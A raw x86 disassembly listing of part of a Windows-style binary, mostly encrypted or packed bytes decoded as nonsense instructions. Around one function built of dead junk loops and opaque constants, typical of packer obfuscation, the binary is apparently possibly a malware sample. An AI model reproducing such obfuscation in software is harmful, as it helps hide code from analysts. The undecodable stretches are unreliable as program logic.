  407e17:	cmp    DWORD PTR [ebx+ecx*1+0x6c],0xffffffec
  407e1c:	cwde   
  407e1d:	mov    dl,0xa
  407e1f:	mov    ebx,0x6559372d
  407e24:	dec    ecx
  407e25:	mov    dl,0x71
  407e27:	arpl   WORD PTR [edx],bx
  407e29:	or     edx,0xffffffb3
  407e2c:	mov    ds:0x721790b5,al
  407e31:	inc    esp
  407e32:	iret   
  407e33:	fnstcw WORD PTR [esi]
  407e35:	loopne 0x407db9
  407e37:	dec    edi
  407e38:	jbe    0x407dde
  407e3a:	icebp  
  407e3b:	jns    0x407e34
  407e3d:	xor    al,0x1f
  407e3f:	js     0x407e23
  407e41:	(bad)  
  407e42:	loopne 0x407e74
  407e44:	mov    bh,BYTE PTR [ebp-0x5b185c31]
  407e4a:	inc    esi
  407e4b:	adc    al,0xd7
  407e4d:	fisttp QWORD PTR [edx-0x40]
  407e50:	or     BYTE PTR [esi+0x5a913bc7],bl
  407e56:	push   ebx
  407e57:	xlat   BYTE PTR ds:[ebx]
  407e58:	ja     0x407e9b
  407e5a:	(bad)  
  407e5b:	es sub al,0x13
  407e5e:	add    eax,0x681f7e1f
  407e63:	(bad)  [ebx]
  407e65:	or     edx,DWORD PTR [eax-0x1]
  407e68:	adc    eax,DWORD PTR [eax-0x63e18325]
  407e6e:	or     al,0xae
  407e70:	cmp    cl,bl
  407e72:	push   edi
  407e73:	sub    DWORD PTR [ecx+0x7527adb5],0xffffff85
  407e7a:	enter  0x7826,0xa5
  407e7e:	std    
  407e7f:	mov    bl,0x1
  407e81:	mov    dh,0x4c
  407e83:	test   BYTE PTR [edi],dh
  407e85:	mov    al,0xdb
  407e87:	xchg   esi,eax
  407e88:	iret   
  407e89:	in     al,dx
  407e8a:	out    0xd2,al
  407e8c:	lock ds dec edi
  407e8f:	mov    al,0x41
  407e91:	pop    ebx
  407e92:	xchg   edx,eax
  407e93:	mov    al,0x76
  407e95:	push   ecx
  407e96:	in     eax,0xc0
  407e98:	int3   
  407e99:	fcmovnu st,st(4)
  407e9b:	jns    0x407eef
  407e9d:	sahf   
  407e9e:	adc    eax,0x796a3d42
  407ea3:	add    eax,0x9c3f791d
  407ea8:	mov    ebx,0xc5d8bb3c
  407ead:	fcomp  QWORD PTR [eax]
  407eaf:	dec    ebx
  407eb0:	xor    ebp,DWORD PTR [ebp+0x1b]
  407eb3:	or     ecx,DWORD PTR [ecx+0x32]
  407eb6:	pop    edi
  407eb7:	(bad)  
  407eb8:	jecxz  0x407eab
  407eba:	mov    edx,0xffff2df0
  407ebf:	ret    
  407ec0:	push   ebp
  407ec1:	mov    ebp,esp
  407ec3:	sub    esp,0x28
  407ec6:	xor    DWORD PTR ds:0x4267d8,edx
  407ecc:	push   ebx
  407ecd:	mov    eax,ds:0x42687c
  407ed2:	mov    edx,DWORD PTR ds:0x4268bc
  407ed8:	sub    eax,edx
  407eda:	add    eax,DWORD PTR [eax+edx*1]
  407edd:	mov    DWORD PTR [ebp-0x18],0xce941f82
  407ee4:	mov    DWORD PTR ds:0x426844,0x1f
  407eee:	cmp    DWORD PTR ds:0x426844,0x0
  407ef5:	je     0x407f44
  407efb:	cmp    DWORD PTR ds:0x426844,0xf
  407f02:	jle    0x407f44
  407f08:	jmp    0x407f18
  407f0d:	push   0x59c6
  407f12:	call   DWORD PTR ds:0x4257b8
  407f18:	cmp    DWORD PTR ds:0x426844,0x10
  407f1f:	jne    0x407f32
  407f25:	mov    edx,DWORD PTR ds:0x426844
  407f2b:	dec    edx
  407f2c:	mov    DWORD PTR ds:0x426844,edx
  407f32:	mov    edx,DWORD PTR ds:0x426844
  407f38:	dec    edx
  407f39:	mov    DWORD PTR ds:0x426844,edx
  407f3f:	jmp    0x407eee
  407f44:	mov    eax,0xffff2df0
  407f49:	mov    DWORD PTR [ebp-0x14],eax
  407f4c:	or     DWORD PTR ds:0x426830,ecx
  407f52:	mov    DWORD PTR [ebp-0x20],0xce941f81
  407f59:	push   esi
  407f5a:	sub    DWORD PTR ds:0x4267fc,ecx
  407f60:	mov    DWORD PTR [ebp-0x1c],eax
  407f63:	neg    DWORD PTR ds:0x4267d0
  407f69:	mov    edx,DWORD PTR [ebp+0x10]
  407f6c:	sbb    DWORD PTR ds:0x426848,0x4c98
  407f76:	xor    ebx,ebx
  407f78:	push   edi
  407f79:	mov    edi,0xa9bdbec9
  407f7e:	add    edx,edi
  407f80:	mov    eax,ds:0x4267b4
  407f85:	mov    esi,0xffffa89a
  407f8a:	adc    ebx,esi
  407f8c:	and    DWORD PTR ds:0x426828,0x0
  407f96:	jmp    0x407fa8
  407f9b:	mov    ecx,DWORD PTR ds:0x426828
  407fa1:	inc    ecx
  407fa2:	mov    DWORD PTR ds:0x426828,ecx
  407fa8:	cmp    DWORD PTR ds:0x426828,0x17
  407faf:	jae    0x407fd7
  407fb5:	cmp    DWORD PTR ds:0x426828,0x19
  407fbc:	jle    0x407fd7
  407fc2:	jmp    0x407fd2
  407fc7:	push   0x42604a
  407fcc:	call   DWORD PTR ds:0x4257bc
  407fd2:	jmp    0x407f9b
  407fd7:	mov    ecx,0x856a
  407fdc:	xor    ebx,ecx
  407fde:	xor    DWORD PTR ds:0x4267e4,0x11b6
  407fe8:	mov    DWORD PTR [ebp-0x24],ebx
  407feb:	and    DWORD PTR ds:0x4267b8,0x0
  407ff5:	mov    eax,ds:0x4267b8
  407ffa:	inc    eax
  407ffb:	mov    ds:0x4267b8,eax
  408000:	cmp    DWORD PTR ds:0x4267b8,0xf
  408007:	jge    0x408047
  40800d:	jmp    0x408022
  408012:	push   0x1c47
  408017:	push   0x42680c
  40801c:	call   DWORD PTR ds:0x4257c0
  408022:	cmp    DWORD PTR ds:0x4267b8,0xe
  408029:	jne    0x40803a
  40802f:	mov    eax,ds:0x4267b8
  408034:	inc    eax
  408035:	mov    ds:0x4267b8,eax
  40803a:	cmp    DWORD PTR ds:0x4267b8,0x19
  408041:	jb     0x407ff5
  408047:	mov    ebx,DWORD PTR [ebp-0x18]
  40804a:	mov    DWORD PTR ds:0x42680c,0x1c
  408054:	cmp    DWORD PTR ds:0x42680c,0x0
  40805b:	je     0x4080ab
  408061:	cmp    DWORD PTR ds:0x42680c,0x6
  408068:	ja     0x4080ab
  40806e:	jmp    0x408083
  408073:	push   0x426854
  408078:	push   0x426000
  40807d:	call   DWORD PTR ds:0x4257c4
  408083:	cmp    DWORD PTR ds:0x42680c,0x7
  40808a:	jne    0x40809b
  408090:	mov    eax,ds:0x42680c
  408095:	dec    eax
  408096:	mov    ds:0x42680c,eax
  40809b:	mov    eax,ds:0x42680c
  4080a0:	dec    eax
  4080a1:	mov    ds:0x42680c,eax
  4080a6:	jmp    0x408054
  4080ab:	mov    eax,0x6729a14b
  4080b0:	mov    DWORD PTR [ebp-0x10],ebx
  4080b3:	add    DWORD PTR ds:0x4267b8,edi
  4080b9:	mov    ebx,DWORD PTR [ebp-0x14]
  4080bc:	xor    edx,eax
  4080be:	mov    DWORD PTR ds:0x42680c,0x50e4
  4080c8:	mov    DWORD PTR [ebp-0xc],ebx
  4080cb:	mov    DWORD PTR ds:0x4267cc,0x5aab
  4080d5:	cmp    DWORD PTR [ebp-0x10],edx
  4080d8:	jne    0x4080e9
  4080de:	mov    edx,DWORD PTR [ebp-0x24]
  4080e1:	cmp    ebx,edx
  4080e3:	je     0x40c877
  4080e9:	mov    edx,DWORD PTR [ebp+0x8]
  4080ec:	mov    ebx,DWORD PTR [ebp+0xc]
  4080ef:	cmp    ebx,edx
  4080f1:	je     0x40c877
  4080f7:	mov    edx,DWORD PTR [ebp-0x18]
  4080fa:	mov    ebx,DWORD PTR [ebp-0x14]
  4080fd:	mov    ebx,DWORD PTR [ebp+0x10]
  408100:	and    DWORD PTR [ebp-0xc],0x0
  408104:	mov    DWORD PTR [ebp-0x10],ebx
  408107:	xor    edx,eax
  408109:	add    edx,0x56424137
  40810f:	add    DWORD PTR [ebp-0x10],edi
  408112:	mov    ebx,DWORD PTR [ebp-0x10]
  408115:	mov    DWORD PTR [ebp-0x4],edx
  408118:	adc    DWORD PTR [ebp-0xc],esi
  40811b:	xor    ebx,eax
  40811d:	mov    DWORD PTR [ebp-0x28],ebx
  408120:	mov    ebx,DWORD PTR [ebp-0xc]
  408123:	and    DWORD PTR [ebp-0xc],0x0
  408127:	xor    ebx,ecx
  408129:	mov    DWORD PTR [ebp-0x24],ebx
  40812c:	mov    ebx,edx
  40812e:	add    ebx,edi
  408130:	jmp    0x40a481
  408135:	xchg   edi,eax
  408136:	popa   
  408137:	in     eax,0x10
  408139:	jne    0x40814f
  40813b:	jbe    0x4081a1
  40813d:	in     al,dx
  40813e:	sbb    esp,edx
  408140:	cld    
  408141:	xor    bh,0xe2
  408144:	fmul   QWORD PTR [ecx+eiz*8-0x67508485]
  40814b:	jnp    0x4081c8
  40814d:	adc    eax,DWORD PTR [edx+0x6684242b]
  408153:	push   edi
  408154:	scas   eax,DWORD PTR es:[edi]
  408155:	dec    ebp
  408156:	sbb    esp,DWORD PTR [ebp+0x2adb269c]
  40815c:	repz in al,dx
  40815e:	mov    ss,WORD PTR [ebx-0x7e]
  408161:	sub    eax,0x155373f2
  408166:	dec    edi
  408167:	pushf  
  408168:	xchg   ecx,eax
  408169:	push   0x5d5a2bc6
  40816e:	xchg   esi,eax
  40816f:	mov    BYTE PTR [edx+ecx*4-0x630e2c9f],dl
  408176:	add    al,0x9a
  408178:	push   ds
  408179:	out    dx,al
  40817a:	les    ebp,FWORD PTR [esi+0x6b]
  40817d:	cmp    al,0x34
  40817f:	push   eax
  408180:	sub    cl,bl
  408182:	mov    ebp,0x70de1e00
  408187:	and    BYTE PTR [ebx-0x1d199905],bh
  40818d:	xchg   ebp,eax
  40818e:	dec    ecx
  40818f:	add    dh,bl
  408191:	aam    0x7f
  408193:	inc    ecx
  408194:	gs (bad) 
  408196:	stc    
  408197:	dec    ebp
  408198:	lds    esp,FWORD PTR [esp+ecx*2+0x3dcb00ff]
  40819f:	xchg   esp,eax
  4081a0:	mov    cs,WORD PTR [edi+0x7e]
  4081a3:	pop    edi
  4081a4:	into   
  4081a5:	jae    0x408136
  4081a7:	adc    eax,ecx
  4081a9:	ins    DWORD PTR es:[edi],dx
  4081aa:	mov    ebx,0x80d1efca
  4081af:	push   ebp
  4081b0:	and    ecx,esp
  4081b2:	sbb    bh,BYTE PTR [esi]
  4081b4:	pusha  
  4081b5:	xor    al,0x5
  4081b7:	xlat   BYTE PTR ds:[ebx]
  4081b8:	loop   0x408224
  4081ba:	ins    BYTE PTR es:[edi],dx
  4081bb:	in     eax,0x48
  4081bd:	mov    dh,0xbb
  4081bf:	sub    esp,edx
  4081c1:	jecxz  0x4081c5
  4081c3:	sar    BYTE PTR ds:0x85b88ee0,0x99
  4081ca:	jl     0x4081e3
  4081cc:	inc    ebp
  4081cd:	push   esp
  4081ce:	adc    DWORD PTR ds:0x7112d2bd,edx
  4081d4:	inc    ebx
  4081d6:	lea    edi,[ecx-0x3b]
  4081d9:	adc    eax,0x95db4b60
  4081de:	scas   al,BYTE PTR es:[edi]
  4081df:	clc    
  4081e0:	inc    edx
  4081e1:	push   eax
  4081e2:	sub    eax,0x3fd3c5d0
  4081e7:	mov    ds:0x5d5f2bac,al
  4081ec:	sbb    edi,DWORD PTR [ebx]
  4081ee:	mov    eax,0x325c51c9
  4081f3:	mov    al,0x11
  4081f5:	sbb    edx,DWORD PTR [eax+0x7a]
  4081f8:	sub    BYTE PTR [edx+0x1e8f58f3],cl
  4081fe:	jle    0x40825f
  408200:	push   esi
  408201:	mov    dh,0x4a
  408203:	jg     0x408233
  408205:	jmp    0x16a8:0xa5c1ca7a
  40820c:	cwde   
  40820d:	dec    esp
  40820e:	les    ebx,FWORD PTR [edx-0x63]
  408211:	mov    ch,0xae
  408213:	ss ret 
  408215:	mov    al,0x7c
  408217:	push   0xffffffc3
  408219:	xchg   ebx,eax
  40821a:	loope  0x4081cf
  40821c:	xchg   esi,eax
  40821d:	inc    eax
  40821e:	adc    edi,DWORD PTR [ebx+eax*8-0x6]
  408222:	fld    TBYTE PTR [eax-0x482bccce]
  408228:	jno    0x4081be
  40822a:	hlt    
  40822b:	and    eax,0x87541db8
  408230:	inc    edx
  408231:	mov    BYTE PTR [ebp-0x7f06a33b],bh
  408237:	sbb    al,0xea
  408239:	pop    ebp
  40823a:	dec    eax
  40823b:	fistp  WORD PTR [edx]
  40823d:	sbb    al,BYTE PTR [edx-0x46621454]
  408243:	rol    BYTE PTR [esp+edi*2],cl
  408246:	push   0xffffff8d
  408248:	ret    0xba3f
  40824b:	daa    
  40824c:	scas   al,BYTE PTR es:[edi]
  40824d:	sar    BYTE PTR [eax+0xf7a3e4f],1
  408253:	aas    
  408254:	and    al,BYTE PTR [ebp-0xb498e6]
  40825a:	jle    0x4081e0
  40825c:	call   0xeba9:0xfc09d611
  408263:	jnp    0x40827e
  408265:	sbb    eax,0xee89e5ec
  40826a:	mov    al,0x1e
  40826c:	xor    ebp,DWORD PTR [esi+0x5597817f]
  408272:	aad    0xb0
  408274:	sbb    eax,0x2468a5cb
  408279:	and    eax,0xf6c18c35
  40827e:	adc    dl,al
  408280:	stos   BYTE PTR es:[edi],al
  408281:	(bad)  
  408283:	jmp    0xa6537fb9
  408288:	xchg   edx,eax
  408289:	and    BYTE PTR [ecx+0x3e],0xaa
  40828d:	fstp   DWORD PTR [edi+0x38]
  408290:	enter  0xef0,0xb1
  408294:	bound  esp,QWORD PTR [ebx]
  408296:	ret    
  408297:	addr16 mov ecx,0x4091db12
  40829d:	loope  0x408262
  40829f:	mov    al,0x77
  4082a1:	popa   
  4082a2:	ss xor dh,bl
  4082a5:	add    DWORD PTR [esi*4-0x4cabb867],esp
  4082ac:	push   cs
  4082ad:	pop    es
  4082ae:	add    BYTE PTR [ecx],bh
  4082b0:	add    eax,0x768a3fdf
  4082b5:	lods   al,BYTE PTR ds:[esi]
  4082b6:	lods   al,BYTE PTR ds:[esi]
  4082b7:	or     bh,ah
  4082b9:	dec    edi
  4082ba:	and    DWORD PTR [ebx+edi*2+0x34],esp
  4082be:	repz mov bh,0x74
  4082c1:	xchg   ebp,eax
  4082c2:	jb     0x40828a
  4082c4:	dec    ecx
  4082c5:	dec    ebp
  4082c6:	and    BYTE PTR [edx],cl
  4082c8:	xchg   edi,eax
  4082c9:	fs (bad) 
  4082cb:	and    eax,0xddc06618
  4082d0:	cmp    ebx,DWORD PTR [edi]
  4082d2:	inc    edx
  4082d3:	fdiv   QWORD PTR [ecx]
  4082d5:	iret   
  4082d6:	(bad)  
  4082d7:	xchg   ebx,eax
  4082d8:	mov    ebp,?
  4082da:	or     al,0x37
  4082dc:	mov    cl,0xcc
  4082de:	jbe    0x40827a
  4082e0:	pusha  
  4082e1:	fucomi st,st(7)
  4082e3:	adc    eax,0xda76f7be
  4082e8:	adc    ecx,eax
  4082ea:	xor    edx,DWORD PTR [edx+0x37]
  4082ed:	ja     0x4082d8
  4082ef:	ror    BYTE PTR [eax-0x4b],0x71
  4082f3:	loope  0x4082c4
  4082f5:	test   eax,0xafac32f3
  4082fa:	mov    bh,0x97
  4082fc:	or     esi,DWORD PTR [ebx+ecx*4-0x24]
  408300:	shr    esp,1
  408302:	mov    fs,WORD PTR [ecx+0x48]
  408305:	stc    
  408306:	mov    dl,0xb7
  408308:	lods   al,BYTE PTR ds:[esi]
  408309:	inc    ecx
  40830a:	add    al,0x37
  40830c:	repz mov dl,0x4c
  40830f:	retf   0xae83
  408312:	std    
  408313:	ds test esp,0xc487920a
  40831a:	popa   
  40831b:	jmp    0x4082ca
  40831d:	push   ecx
  40831e:	dec    esi
  40831f:	xor    esi,ebp
  408321:	cdq    
  408322:	dec    eax
  408323:	add    ebp,DWORD PTR [ebx]
  408325:	dec    ecx
  408326:	cld    
  408327:	pop    ebx
  408328:	jl     0x408353
  40832a:	out    0xd4,al
  40832c:	inc    edi
  40832d:	cld    
  40832e:	shl    bh,0x21
  408331:	xchg   ecx,eax
  408332:	or     dl,cl
  408334:	add    dh,BYTE PTR [ebp+0x67e23f95]
  40833a:	scas   al,BYTE PTR es:[edi]
  40833b:	jl     0x408340
  40833d:	popw   es
  40833f:	loopne 0x40835f
  408341:	int3   
  408342:	les    eax,FWORD PTR [esi]
  408344:	int3   
  408345:	imul   esp,DWORD PTR [edi-0x6b],0xfdeaf134
  40834c:	adc    DWORD PTR [eax+0x3e4f6106],ebx
  408352:	jbe    0x408372
  408354:	push   ecx
  408355:	in     al,0xee
  408357:	and    dh,BYTE PTR [edx+ebx*1]
  40835a:	in     eax,0x73
  40835c:	js     0x4083dd
  40835e:	mov    ah,0x3
  408360:	jmp    0xf8a23b96
  408365:	or     dl,bl
  408367:	int3   
  408368:	jmp    DWORD PTR [edx]
  40836a:	sub    DWORD PTR [ebx-0x1a06c6a8],esi
  408370:	push   esp
  408371:	in     al,dx
  408372:	scas   eax,DWORD PTR es:[edi]
  408373:	stos   BYTE PTR es:[edi],al
  408374:	mov    bh,BYTE PTR [edi+0x31]
  408377:	scas   al,BYTE PTR es:[edi]
  408378:	clc    
  408379:	fistp  WORD PTR [ebx-0x1a2b7a4b]
  40837f:	into   
  408380:	call   0xd819cfc7
  408385:	in     eax,0x5d
  408387:	jae    0x40839e
  408389:	sub    al,0x3a
  40838b:	push   es
  40838c:	dec    eax
  40838d:	and    eax,DWORD PTR [ecx-0x12]
  408390:	retf   
  408391:	push   cs
  408392:	mov    al,ds:0x544d6e34
  408397:	pop    ebx
  408398:	addr16 in eax,0x42
  40839b:	mov    ecx,0x8c9598e
  4083a0:	push   ebx
  4083a1:	es inc esi
  4083a3:	sbb    cl,bl
  4083a5:	mov    edx,fs
  4083a7:	or     eax,0xe282280c
  4083ac:	pop    ss
  4083ad:	rcl    DWORD PTR [eax+0x40],0x1b
  4083b1:	mov    esi,0xaeca6c1c
  4083b6:	call   0xc369df10
  4083bb:	int3   
  4083bc:	scas   al,BYTE PTR es:[edi]
  4083bd:	cmp    esp,0xffffffe4
  4083c0:	popa   
  4083c1:	inc    eax
  4083c2:	sub    ecx,DWORD PTR [eax-0xa]
  4083c5:	fwait
  4083c6:	call   0xd5ca87b4
  4083cb:	jl     0x408351
  4083cd:	inc    ecx
  4083ce:	and    DWORD PTR [edx-0x77],ebx
  4083d1:	pop    ss
  4083d2:	adc    DWORD PTR [eax-0x4dc82a42],ecx
  4083d8:	push   ebx
  4083d9:	repz (bad) 
  4083db:	jmp    DWORD PTR [eax+0x5060410c]
  4083e1:	ins    DWORD PTR es:[edi],dx
  4083e2:	clc    
  4083e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e4:	add    al,0x43
  4083e6:	inc    ebx
  4083e7:	add    edx,DWORD PTR [edx+0x19]
  4083ea:	sahf   
  4083eb:	cmp    eax,0x28336b4b
  4083f0:	test   bh,bl
  4083f2:	sub    DWORD PTR [ecx-0x435475af],ecx
  4083f8:	mov    al,0xd
  4083fa:	xchg   edi,eax
  4083fb:	mov    WORD PTR [edi-0x2b],es
  4083fe:	mov    BYTE PTR [eax-0x5a05ab49],al
  408404:	(bad)  
  408405:	jno    0x408453
  408407:	mov    DWORD PTR [edi-0x2ab97897],edi
  40840d:	and    BYTE PTR [edi-0x304ba64c],ch
  408413:	fidivr DWORD PTR [edi]
  408415:	aad    0x24
  408417:	cdq    
  408418:	or     DWORD PTR [ecx-0x11],edi
  40841b:	clc    
  40841c:	stc    
  40841d:	std    
  40841e:	sub    eax,0xb397570f
  408423:	sub    ebx,DWORD PTR [eax-0x28]
  408426:	cmp    DWORD PTR [eax-0x332a00f5],0x35
  40842d:	or     esp,DWORD PTR [esi+0x74fad537]
  408433:	push   esi
  408434:	mov    eax,edx
  408436:	int3   
  408437:	shl    DWORD PTR [ecx-0x34],cl
  40843a:	mov    ebp,0xde240e57
  40843f:	add    bl,BYTE PTR [eax+0x5b]
  408442:	dec    edx
  408443:	fldenv [ebx+0x2f]
  408446:	mov    bh,BYTE PTR [ebp+0x606242bd]
  40844c:	mov    dl,0x9
  40844e:	shl    DWORD PTR [ebx+ebx*8+0x7d885017],0xd0
  408456:	pop    edi
  408457:	sub    eax,0x2e7ed613
  40845c:	inc    ecx
  40845d:	mov    eax,0xf11f31a8
  408462:	addr16 inc ecx
  408464:	shl    DWORD PTR [ecx+0x15],1
  408467:	in     al,0xe3
  408469:	sbb    eax,0xfea79bd0
  40846e:	sti    
  40846f:	and    DWORD PTR [eax-0x7],0x4501afe8
  408476:	outs   dx,BYTE PTR ds:[esi]
  408477:	xchg   ecx,eax
  408478:	sbb    dh,ah
  40847a:	fs push ebp
  40847c:	fwait
  40847d:	std    
  40847e:	push   edx
  40847f:	jno    0x4084a6
  408481:	cmp    eax,ebx
  408483:	cli    
  408484:	dec    ebx
  408485:	into   
  408486:	jl     0x40843a
  408488:	jge    0x40844d
  40848a:	sbb    eax,0x5e2cea3d
  40848f:	inc    eax
  408490:	xor    bh,ah
  408492:	pop    ss
  408493:	cmp    DWORD PTR [edx],edi
  408495:	outs   dx,BYTE PTR ds:[esi]
  408496:	test   eax,0xb150ac89
  40849b:	lea    ebp,[ebp+0x22]
  40849e:	sbb    dl,BYTE PTR [edx]
  4084a0:	(bad)  
  4084a2:	or     cl,dh
  4084a4:	mov    dl,0xfd
  4084a6:	inc    ecx
  4084a7:	loop   0x4084ca
  4084a9:	and    al,0x45
  4084ab:	mov    al,0x48
  4084ad:	fs ror bl,0x80
  4084b1:	add    ecx,DWORD PTR [ebx-0x33f5940e]
  4084b7:	fsub   DWORD PTR [ecx-0x38]
  4084ba:	fstp   TBYTE PTR [edi+0xd]
  4084bd:	in     eax,dx
  4084be:	push   es
  4084bf:	mov    DWORD PTR [edi+edi*8],ebx
  4084c2:	into   
  4084c3:	pop    edi
  4084c4:	xchg   ebx,eax
  4084c5:	and    ebp,DWORD PTR [edi+0x15]
  4084c8:	mov    ebx,0x8e701247
  4084cd:	xor    al,BYTE PTR [ecx-0x12]
  4084d0:	loop   0x408530
  4084d2:	or     esi,DWORD PTR [edi+0xd438d29]
  4084d8:	loop   0x40847e
  4084da:	jl     0x408538
  4084dc:	push   edx
  4084dd:	pop    esi
  4084de:	sbb    DWORD PTR [edx-0x5e916fa5],edx
  4084e4:	sub    al,0xaa
  4084e6:	xchg   edx,eax
  4084e7:	sub    BYTE PTR ds:0xebf54560,ah
  4084ed:	out    0xb2,al
  4084ef:	jns    0x4084b2
  4084f1:	inc    edx
  4084f2:	fst    st(1)
  4084f4:	sbb    eax,0x5df42dab
  4084f9:	xchg   DWORD PTR [bx+di+0x9],esi
  4084fd:	fnstsw WORD PTR [eax+0x77]
  408500:	and    BYTE PTR [ecx-0x34],ah
  408503:	add    eax,0x175bc690
  408508:	scas   al,BYTE PTR es:[edi]
  408509:	mov    esi,ebx
  40850b:	retf   0x4591
  40850e:	mov    edx,0x39e19f8c
  408513:	xlat   BYTE PTR ds:[ebx]
  408514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408515:	lods   eax,DWORD PTR ds:[esi]
  408516:	sub    BYTE PTR [eax+0x7],ch
  408519:	cmp    DWORD PTR [ebx],ecx
  40851b:	jmp    0x5dc7:0x3e65ed15
  408522:	pop    ss
  408523:	lahf   
  408524:	mov    edi,0x9835ec61
  408529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40852a:	adc    al,0xa7
  40852c:	lods   al,BYTE PTR ds:[esi]
  40852d:	xor    al,0xbf
  40852f:	dec    ecx
  408530:	pop    ds
  408531:	xor    DWORD PTR [esi],eax
  408533:	xor    DWORD PTR [eax+0x65],edx
  408536:	pop    edx
  408537:	inc    ecx
  408538:	xor    dh,BYTE PTR [ebx-0x36]
  40853b:	mov    cl,0x52
  40853d:	icebp  
  40853e:	repz test DWORD PTR fs:[ebp-0x739fc2ec],edx
  408546:	ret    0xa4c4
  408549:	push   ecx
  40854a:	pop    edx
  40854b:	xchg   edx,eax
  40854c:	gs retf 0xa637
  408550:	mov    bh,0x3d
  408552:	add    eax,0x4f498c93
  408557:	mov    esi,0x16fd6384
  40855c:	add    eax,0x56183938
  408561:	(bad)  
  408562:	sbb    bl,BYTE PTR [edi]
  408564:	jnp    0x408551
  408566:	jg     0x408562
  408568:	xchg   edx,eax
  408569:	mov    bl,0xec
  40856b:	nop
  40856c:	stos   DWORD PTR es:[edi],eax
  40856d:	push   esp
  40856e:	scas   eax,DWORD PTR es:[edi]
  40856f:	inc    edx
  408570:	popf   
  408571:	rcl    DWORD PTR [esi+0x67],1
  408574:	(bad)  
  408575:	cmp    DWORD PTR [ebp-0x7f4771e7],ebp
  40857b:	mov    ch,0x34
  40857d:	or     al,0xb2
  40857f:	test   dh,ah
  408581:	dec    ebp
  408582:	icebp  
  408583:	push   edx
  408584:	imul   eax,DWORD PTR [ecx-0x2d],0xca04987e
  40858b:	jecxz  0x4085ef
  40858d:	call   0xd4adb9cc
  408592:	sbb    al,dl
  408594:	ret    0xdbd5
  408597:	mov    al,BYTE PTR [eax+0x25]
  40859a:	and    DWORD PTR [ecx+ebp*4+0x3],0x71ffdd6f
  4085a2:	adc    al,0x62
  4085a4:	mov    eax,0x45f8316
  4085a9:	lahf   
  4085aa:	imul   esp,DWORD PTR [esi-0x5a],0xa8242011
  4085b1:	and    eax,0xb1241d6c
  4085b6:	bound  esi,QWORD PTR [edx+0x2a]
  4085b9:	mov    esp,0x497c47b3
  4085be:	fisub  DWORD PTR [eax]
  4085c0:	popf   
  4085c1:	aas    
  4085c2:	add    ah,BYTE PTR [esi-0x80]
  4085c5:	jmp    0x408577
  4085c7:	pop    eax
  4085c8:	and    DWORD PTR [edx+eax*8],ebp
  4085cb:	jo     0x4085e3
  4085cd:	rcl    BYTE PTR [ecx-0x36cdc565],cl
  4085d3:	add    al,0x8a
  4085d5:	fs clc 
  4085d7:	pushf  
  4085d8:	std    
  4085d9:	scas   al,BYTE PTR es:[edi]
  4085da:	lea    edx,[edx+0x31]
  4085dd:	add    DWORD PTR [esi+ecx*4-0x3a38d18f],ecx
  4085e4:	enter  0x4fe3,0xc7
  4085e8:	stc    
  4085e9:	and    DWORD PTR [eax-0x4e636e80],ecx
  4085ef:	inc    esi
  4085f0:	ret    
  4085f1:	fdiv   QWORD PTR [esi-0x49]
  4085f4:	and    eax,0xc0ccdb73
  4085f9:	fsub   QWORD PTR [esi]
  4085fb:	pop    ss
  4085fc:	mov    ch,0x1f
  4085fe:	(bad)  
  4085ff:	fdiv   QWORD PTR [edi+0x6c7512f1]
  408605:	sub    DWORD PTR [edi+0x2ce2e591],eax
  40860b:	push   es
  40860c:	mov    BYTE PTR [ebx],bh
  40860e:	addr16 push esp
  408610:	stos   DWORD PTR es:[edi],eax
  408611:	aas    
  408612:	cld    
  408613:	mov    dl,0x97
  408615:	sbb    al,0xd0
  408617:	lods   eax,DWORD PTR ds:[esi]
  408618:	(bad)  
  40861a:	push   0xc7345ac6
  40861f:	imul   esp,esi,0xac9ab3f
  408625:	ins    BYTE PTR es:[edi],dx
  408626:	sub    eax,0x3c3cd25f
  40862b:	leave  
  40862c:	int3   
  40862d:	cmc    
  40862e:	in     al,0x79
  408630:	or     cl,BYTE PTR ds:0x97ebccd0
  408636:	(bad)  
  408637:	sbb    esi,DWORD PTR [esi+0x6ae80ad]
  40863d:	popa   
  40863e:	cmp    DWORD PTR [eax+eiz*8-0x10],eax
  408642:	adc    DWORD PTR [edx-0x6d76fe8],esi
  408648:	mov    ebx,0xbb97dbe6
  40864d:	mov    ebp,0xa49ddbde
  408652:	pop    ds
  408653:	das    
  408654:	xchg   ebx,eax
  408655:	out    dx,al
  408656:	sbb    eax,0x8d4052e6
  40865b:	xor    dh,al
  40865d:	fldcw  WORD PTR [esi+0x759ed6ab]
  408663:	sbb    al,0x89
  408665:	das    
  408666:	stc    
  408667:	fsubp  st(3),st
  408669:	daa    
  40866a:	aaa    
  40866b:	sbb    al,0x2e
  40866d:	stos   DWORD PTR es:[edi],eax
  40866e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40866f:	push   0x7d173d9d
  408674:	loopne 0x4086e8
  408676:	scas   al,BYTE PTR es:[edi]
  408677:	fldcw  WORD PTR [edi+edx*8]
  40867a:	sbb    al,0xa
  40867c:	loop   0x40861e
  40867e:	test   DWORD PTR [esi-0x2d],0x32ef2fbf
  408685:	mov    ds:0x12a03fb,al
  40868a:	pop    esi
  40868b:	outs   dx,DWORD PTR ds:[esi]
  40868c:	cmc    
  40868d:	shl    BYTE PTR [eax],1
  40868f:	push   ebx
  408690:	aam    0x68
  408692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408693:	call   0x118c:0xf980dc7a
  40869a:	outs   dx,DWORD PTR ds:[esi]
  40869b:	xchg   BYTE PTR [edx],dh
  40869d:	out    0xb8,al
  40869f:	jmp    0x2a91e282
  4086a4:	sub    al,0xd
  4086a6:	nop
  4086a7:	std    
  4086a8:	cmp    eax,0x4ca03c88
  4086ad:	push   esi
  4086ae:	icebp  
  4086af:	fadd   DWORD PTR [ebp-0x1ca25591]
  4086b5:	pop    ecx
  4086b6:	sub    BYTE PTR [ebx+eax*1-0xf],al
  4086ba:	mov    cl,0x94
  4086bc:	int    0x1d
  4086be:	mov    ebx,0xd33e2835
  4086c3:	cmp    eax,0x6c316696
  4086c8:	pop    eax
  4086c9:	add    al,0x46
  4086cb:	leave  
  4086cc:	js     0x40874b
  4086ce:	xor    DWORD PTR ds:0x34423431,0xffffff97
  4086d5:	enter  0x82df,0x94
  4086d9:	jo     0x40874f
  4086db:	inc    ebp
  4086dc:	or     DWORD PTR [esi-0x30a07372],ebx
  4086e2:	shl    BYTE PTR ds:0x6d4baa30,0xb8
